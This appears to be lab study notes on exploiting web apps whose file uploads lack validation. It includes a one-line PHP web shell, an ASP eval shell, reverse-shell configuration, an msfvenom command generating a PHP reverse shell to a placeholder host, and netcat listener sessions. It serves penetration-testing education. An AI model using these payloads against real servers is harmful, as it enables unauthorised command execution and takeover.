## Absent Validation

The most basic type of file upload vulnerability is when the web application `does not have any form of validation filters` on the uploaded files.

With this we can directly upload are web shell or reverse shell to the web application, and then visit the uploaded script to interact with the web or reverse shell.

### Arbitrary File Upload

Here we can upload personal files:
![[file_uploads_file_manager.jpg]]

We can upload any file type we want:
![[file_uploads_file_selection_dialog.jpg]]

With no restrictions on the back-end, we may be able to upload arbitrary file types to the back-end server to gain complete control over it.

### Identifying Web Framework

We need to upload a malicious script to test whether we can upload any file type. Most commonly we will upload web shell and reverse shell scripts.

With a web shell the back-end accepts shell commands and prints the output back to us within the web browser. The web shell must be written in the same programming language that runs the web server, as it runs platform-specific functions and commands to execute system commands on the back-end server. So, the first step would be identify what language runs the web application.

We can often see the web page extension in the URLs, which may reveal the programming language. However, in certain web frameworks and web languages, `Web Routes` are used to map URLs to web pages, in which case the web page extension may not be shown. Furthermore, file upload exploitation would also be different, as our uploaded files may not be directly routable or accessible.

One easy method to determine what language runs the web application is to visit the `/index.ext` page. The `ext` part can be extensions like `php`, `asp`, `aspx`, among others.

For example we may get the same page from `http://SERVER_IP:PORT/` and `http://SERVER_IP:PORT/index.php`, which means that this is indeed a `PHP` web application. We can use a tool like Burp intruder for fuzzing the file extension using a [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) wordlist. This method may not always be accurate, though, as the web application may not utilize index pages or may utilize more then one web extension.

Several other techniques may help identify the technologies running the web application, like using the [Wappalyzer](https://www.wappalyzer.com) extension, which is available for all major browsers. Once added to our browser, we can click its icon to view all technologies running the web application:
![[file_uploads_wappalyzer.jpg]]

We can also run web scanner, like Burp/ZAP or other Web Vulnerability Assessment tools. Once we identify the language running the web application, we may upload a malicious script written in the same language to exploit the web application.

### Vulnerability Identification

As an initial test we can create a basic `Hello World` script to test whether we can execute `PHP` code with our uploaded file.

To do so, we will write `<?php echo "Hello HTB";?>` to `test.php`, and try uploading it to the web application:
![[file_uploads_upload_php.jpg]]

The file appears to have successfully been uploaded, as we get a message saying `File successfully uploaded`, which means that `the web application has no file validation whatsoever on the back-end`. Now, we can click the `Download` button, and the web application will take us to our uploaded file:
![[file_uploads_hello_htb.jpg]]

We can see the `echo` function got executed to print our string, and we successfully executed `PHP` code on the back-end server. If the page could not run PHP code, we would see our source code printed on the page.

## Upload Exploitation

### Web Shells

We can find many excellent web shells online that provide useful features, like directory traversal or file transfer. One good option for PHP is [phpbash](https://github.com/Arrexel/phpbash), which provides a terminal like, semi-interactive web shell. Furthermore [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) provides a plethora of web shells for different frameworks and languages, which can be found in the `/usr/share/Seclists/Web-Shells` directory.

We can upload any of those shells corresponding to the language of the web application through the vulnerable upload feature, and visit the uploaded file to interact with the web application, for example the `phpbash` web shell:
![[file_uploads_php_bash.jpg]]

### Writing Custom Web Shell

We should also know how to write a basic web shell manually. This is because we may not always have access to online tools.

With `PHP` we can use the `system()` function that executes system commands and prints their output, and pass it the `cmd` parameter with `$_REQUEST['cmd']`, as follows:
```php
<?php system($_REQUEST['cmd']); ?>
```

If we write it to a PHP script and upload it to the web application, we can execute system commands with the `?cmd=` GET parameter (e.g. `?cmd=id`), as follows:
http://SERVER_IP:PORT/uploads/shell.php?cmd=id
![[file_uploads_php_manual_shell.jpg]]

**Tip:** If we are using this custom web shell in a browser, it may be best to use source-view by clicking `[CTRL+U]`, as the source-view shows the command output as it would be shown in the terminal, without any HTML rendering that may affect how the output is formatted.

The same applies to other web frameworks, with the only difference being the functions used. For `.NET` web applications, we can pass the `cmd` parameter with `request('cmd')` to the `eval()` function, and it should also execute the command specified in `?cmd=` and print its output, as follows:
```asp
<% eval request('cmd') %>
```

We can find many web shells online, many of them can be easily memorized. It must be noted that `in certain cases, web shells may not work`. This may be due to the web sever preventing the use of some functions utilized by the web shell, or due to a Web Application Firewall, among other reasons. In these cases, we may need to use advanced techniques to bypass these security mitigations.

### Reverse Shell

We should start by downloading a reverse shell script in the language of the web application. A reliable one for PHP is the [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell) PHP reverse shell. Furthermore, the same [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) we mentioned earlier also contains reverse shell scripts for various languages and web frameworks, and we can utilize any of them to receive a reverse shell as well.

We will need to edit the reverse shell to enter our IP and port, For the `pentestmonkey` script, we can modify lines `49` and `50` and input our machine's IP/PORT:
```php
$ip = 'OUR_IP';     // CHANGE THIS
$port = OUR_PORT;   // CHANGE THIS
```

Next, we can start a `netcat` listener on our machine (with the above port), upload our script to the web application, and then visit its link to execute the script and get a reverse shell connection:
```shell-session
$ nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [188.166.173.208] 35232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Generating Custom Reverse Shell Scripts

It's possible to use the `system` function and pass it a reverse shell command, but it may not always be very reliable, as the command may fail for many reasons, just like any other reverse shell command.

This is why it is always better to use core web framework functions to connect to our machine. However it may not be as easy to memorize as a web shell script. We can use tools like `msfvenom` to generate a reverse shell script in many languages and may even attempt to bypass certain restrictions in place. We can do as follow for PHP:
```shell-session
$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

Once our `reverse.php` script is generated, we can once again start a `netcat` listener on the port we specified above, upload the `reverse.php` script and visit its link, and we should receive a reverse shell as well:
```shell-session
$ nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [181.151.182.286] 56232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Similarly, we can generate reverse shell scripts for several languages. We can use many reverse shell payloads with the `-p` flag and specify the output language with the `-f` flag.

While reverse shells are always preferred over web shells, as they provide the most interactive method for controlling the compromised server, they may not always work, and we may have to rely on web shells instead. This can be for several reasons, like having a firewall on the back-end network that prevents outgoing connections or if the web server disables the necessary functions to initiate a connection back to us.